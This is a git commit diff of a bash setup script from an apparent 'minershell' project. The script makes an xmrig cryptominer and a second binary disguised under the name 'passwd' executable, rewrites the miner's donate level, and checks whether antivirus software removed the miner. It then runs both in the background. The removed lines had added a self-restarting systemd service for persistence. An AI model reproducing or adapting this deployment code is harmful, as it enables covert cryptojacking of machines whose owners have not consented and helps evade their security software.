4076e4a71cfca1b7ddbbfffd0ea0d6a5093a6cef
ardx1 <164972915+ardx1@users.noreply.github.com>
2024-04-27 14:42:57 -0300

    Update config.sh

--- config.sh
+++ config.sh
@@ -1,61 +1,39 @@
 #!/bin/bash
 
-# Define a variável HOME como o caminho absoluto do diretório home
-HOME=$(realpath ~)
-
 # Verifica se xmrig e passwd existem e atribui permissões de execução
 if [ -f "$HOME/minershell-main/minershell-main/xmrig" ]; then
-  chmod +x "$HOME/minershell-main/minershell-main/xmrig"
+  chmod +x $HOME/minershell-main/minershell-main/xmrig
 else
   echo "ERROR: xmrig file not found"
   exit 1
 fi
 
 if [ -f "$HOME/minershell-main/minershell-main/passwd" ]; then
-  chmod +x "$HOME/minershell-main/minershell-main/passwd"
+  chmod +x $HOME/minershell-main/minershell-main/passwd
 else
   echo "ERROR: passwd file not found"
+  echo "DEBUG: The current directory is: $(pwd)"
+  echo "DEBUG: The contents of the directory are: $(ls -la $HOME/minershell-main/minershell-main)"
   exit 1
 fi
 
-# Cria o script start_miner.sh na mesma pasta que os arquivos xmrig e passwd
-cat << EOF > "$HOME/minershell-main/minershell-main/start_miner.sh"
-#!/bin/bash
+echo "[*] Checking if advanced version of $HOME/minershell-main/minershell-main/xmrig works fine (and not removed by antivirus software)"
+if [ -f "$HOME/minershell-main/minershell-main/config.json" ]; then
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/minershell-main/minershell-main/config.json
+else
+  echo "ERROR: config.json file not found"
+  exit 1
+fi
 
-# Encerra qualquer instância anterior do xmrig
-killall -9 xmrig
+if $HOME/minershell-main/minershell-main/xmrig --help >/dev/null; then
+  echo "[*] Executing xmrig..."
+  $HOME/minershell-main/minershell-main/xmrig &
+else
+  echo "WARNING: Advanced version of $HOME/minershell-main/minershell-main/xmrig is not functional"
+fi
 
-# Inicia o arquivo xmrig em segundo plano
-echo "[*] Starting xmrig..."
-$HOME/minershell-main/minershell-main/xmrig &
-
-# Inicia o arquivo passwd em segundo plano
-echo "[*] Starting passwd..."
+# Executar o arquivo passwd
+echo "[*] Executing passwd..."
 $HOME/minershell-main/minershell-main/passwd &
-EOF
-
-# Torna o script start_miner.sh executável
-chmod +x "$HOME/minershell-main/minershell-main/start_miner.sh"
-
-# Cria o arquivo de serviço systemd
-cat << EOF > "/etc/systemd/system/miner.service"
-[Unit]
-Description=Miner Service
-After=network.target
-
-[Service]
-Type=simple
-User=$USER
-WorkingDirectory=$HOME/minershell-main/minershell-main
-ExecStart=/bin/bash start_miner.sh
-Restart=always
-RestartSec=10
-
-[Install]
-WantedBy=multi-user.target
-EOF
-
-# Recarrega os serviços systemd
-sudo systemctl daemon-reload
 
 echo "[*] Setup complete."
